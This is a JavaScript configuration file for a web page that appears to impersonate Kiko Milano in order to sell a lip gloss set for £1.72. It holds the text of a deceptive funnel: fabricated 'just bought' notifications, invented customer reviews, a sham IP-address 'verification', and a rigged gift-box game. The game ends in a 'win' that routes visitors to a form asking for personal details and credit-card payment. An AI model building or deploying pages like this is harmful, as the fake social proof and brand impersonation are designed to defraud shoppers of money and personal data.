const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

(function (exp) {
  const countryCode = "gb";
  const lang = "en-GB";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Größe: ",
    arr: [
      "EU 36",
      "EU 37",
      "EU 37.5",
      "EU 38",
      "EU 38.5",
      "EU 39",
      "EU 39.5",
      "EU 40",
      "EU 40.5",
      "EU 41",
      "EU 41.5",
      "EU 42",
      "EU 42.5",
      "EU 43",
      "EU 43.5",
      "EU 44",
      "EU 44.5",
      "EU 45",
      "EU 45.5",
      "EU 46",
      "EU 46.5",
      "EU 47",
      "EU 47.5",
      "EU 48",
      "EU 49",
      "EU 50",
      "EU 51",
      "EU 52",
    ],
  };

  const mainProduct = {
    header: "New | Save 23.00£",
    name: "Kiko Milano Hydra 3D Lip Set",
    oldPrice: "24,72£",
    newPrice: "1.72£",
    selectText: "",
    text: `
    
    
    <b>Soothing Lip Gloss - Kiko Milano 3D Hydra Lip Gloss</b>
    <br><br>
    
    <b>Features:</b>
    <br>
  
    - smooth, non-sticky consistency;<br>
  - The soft felt applicator allows for easy, even application<br>
  - does not slip into creases and allows for clean contouring<br>
  - The rich palette includes many exquisite shades;<br>
  - very resistant;<br>
  - layers with different effects: transparent, glossy, pearly, ultra-pigmented;<br>
  - contains a discount extract<br>
  - stylish compact packaging with company logo<br>
  - dermatologically tested.<br>
  <br><br>
  <b>To receive a personalized discount, please answer a few questions:</b>
  `,
  };

  const notifications = [
    {
      user: "Emilia S*****",
      location: "London, United Kingdom",
      action: "I just got a great product for £1.72!",
      timeago: "15 seconds ago",
    },
    {
      user: "Mia B******",
      location: "Manchester, United Kingdom",
      action: "I just got a great product for £1.72!",
      timeago: "25 seconds ago",
    },
  ];

  const reviewsArr = [
    {
      name: "Sophia ",
      time: "1 day ago",
      header: "Stylish!",
      image: "./assets/r_5.jpg",
      review:
        "I am in love with these glosses. They are available in the most popular shades. They have a very nice consistency and shine very well on the lips. I am very satisfied.",
    },
    {
      name: "Emma ",
      time: "2 days ago",
      header: "Kiko is always great",
      image: "./assets/r_3.jpg",
      review:
        "This is a very cool set, Kiko's glosses have the best texture and good shine",
    },
    {
      name: "Hannah ",
      time: "3 days ago",
      header: "Nice gift",
      image: "./assets/r_4.jpg",
      review:
        "I ordered it as a gift for my daughter, she has been wanting Kiko lip glosses for a long time",
    },
    {
      name: "Lina ",
      time: "5 days ago",
      header: "A touch of irresistible style!",
      image: "./assets/r_6.jpeg",
      review: "A beautiful set of the most popular lip gloss colors.",
    },
    {
      name: "Ella",
      time: "9 days ago",
      header: "I expected nothing less from Kiko.",
      image: "./assets/r_2.jpg",
      review:
        "It's not the first time I buy Kiko Milano cosmetics, always of excellent quality",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "REVIEWS AND REPORTS",
    percent: "99%",
    rec: "recommend this item",
  };

  const questions = {
    _of: "Question {1} of {2}:",
    arr: [
      {
        q: "Have you ever used cosmetics products from Kiko Milano?",
        a: ["Yes", "No"],
      },
      {
        q: "How often do you use lip gloss?",
        a: ["Daily", "Only on holidays", "Depends on the situation"],
      },
      {
        q: "Who are you ordering the kit for?",
        a: ["For myself", "For a friend", "For a family member"],
      },
    ],
  };

  const check = {
    title: "Your answer is being checked.",
    arr: [
      "You have answered Question 3/3.",
      "Your IP address does not reveal any previous requests.",
      "Your answer has been verified.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header:
          "Congratulations, you have confirmed that you are a real person.",
        button: "OK",
        text: `
          <center>
          Today, {date}, you have a chance to win a Kiko Milano Hydra 3D Lip Set.
          <br><br>
          You just need to choose the right gift box.
          <br><br>
          You have 3 attempts, good luck!
          </center>
        `,
      },
    },
    first: {
      texts: {
        header: "Oh no...",
        button: "OK",
        text: `
          <center>
          Unfortunately, this gift is empty! You have 2 attempts left, good luck!
          </center>
        `,
      },
    },
    win: {
      texts: {
        header: "Congratulations! You have won!",
        button: "OK",
        text: `
          <center>
            <p style="color: #000">
            You have won a "Kiko Milano Hydra 3D Lip Set"
            </p>
            <br>
            1) Click "OK" to go to the delivery page.
            <br><br>
            2) Fill out the form and make a payment to receive your set.
            <br><br>
            3) The package will be delivered within 2 to 3 days.
          </center>
        `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Personal Information",
      fields: {
        name: {
          field: "First Name",
        },
        family: {
          field: "Last Name",
        },
        phone: {
          field: "Phone Number",
        },
        email: {
          field: "Email",
        },
      },
    },
    delivery: {
      title: "Delivery",
      fields: {
        city: {
          field: "City",
        },
        address: {
          field: "Delivery Address",
        },
        zip: {
          field: "Postal Code",
        },
      },
    },
    payment: {
      title: "Payment Terms",
      creditCard: "Online Payment by Credit Card",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Order Overview",
      oldPrice: "24.72£",
      newPrice: "1.72£",
      size: "Size",
      subTotal: {
        title: "Order Value",
        amount: "1.72£",
      },
      delivery: {
        title: "Delivery",
        amount: "0.00£",
      },
      total: {
        title: "Total",
        amount: "1.72£",
      },
      checkoutButton: "Proceed to Checkout",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "",
      miniImg: "./assets/P_1.webp",
      images: [
        "./assets/P_1.webp",
        "./assets/P_2.webp",
        "./assets/P_3.webp",
        "./assets/P_4.webp",
      ],
    },
  ];

  const footer = {
    cr: "© 2024 Kiko Milano. All rights reserved.",
  };

  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
